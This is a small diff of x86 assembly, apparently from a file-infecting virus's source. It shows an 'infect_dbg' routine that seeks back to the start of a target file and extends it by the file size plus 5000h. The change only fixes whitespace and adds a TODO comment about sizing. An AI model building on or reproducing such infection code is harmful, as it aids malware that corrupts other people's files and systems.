@@ -273,12 +273,12 @@ infect_dbg:										; DEBUG
 	call	setfilepointer_addr			; Move back to the beginning of the file
 	cmp		eax, -1
 	je		syserr
-	
+
 	push	0
 	lea		ecx, [esp - 4]
 	push	ecx
 	mov		ecx, filesize
-	add		ecx, 5000h
+	add		ecx, 5000h					; TODO: calculate size more properly
 	push	ecx
 	push	fileptr
 	push	filehandle
